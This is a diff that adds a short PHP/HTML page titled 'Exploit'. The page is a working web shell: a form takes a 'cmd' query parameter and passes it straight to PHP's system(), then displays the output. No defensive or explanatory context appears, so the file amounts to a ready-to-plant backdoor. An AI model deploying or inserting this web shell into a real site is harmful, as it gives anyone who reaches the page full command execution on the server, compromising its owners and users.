@@ -1,0 +1,23 @@
+<html>
+    <head></head>
+    <link rel="stylesheet" href="/static/bulma.min.css" />
+    <body>
+        <div class="container card">
+        <div class="card-content">
+        <h1 class="title">Exploit</h1>
+        <form method="GET">
+            <input class="input" type="text" name="cmd" placeholder="Enter command">
+            <input class="button is-success" type="submit" value="Run">
+        </form>
+        <pre>
+    <?php
+        if (isset($_GET['cmd'])) {
+            $cmd = $_GET['cmd'];
+            system($cmd);
+        }
+    ?>
+        </pre>
+        </div>
+        </div>
+    </body>
+</html>
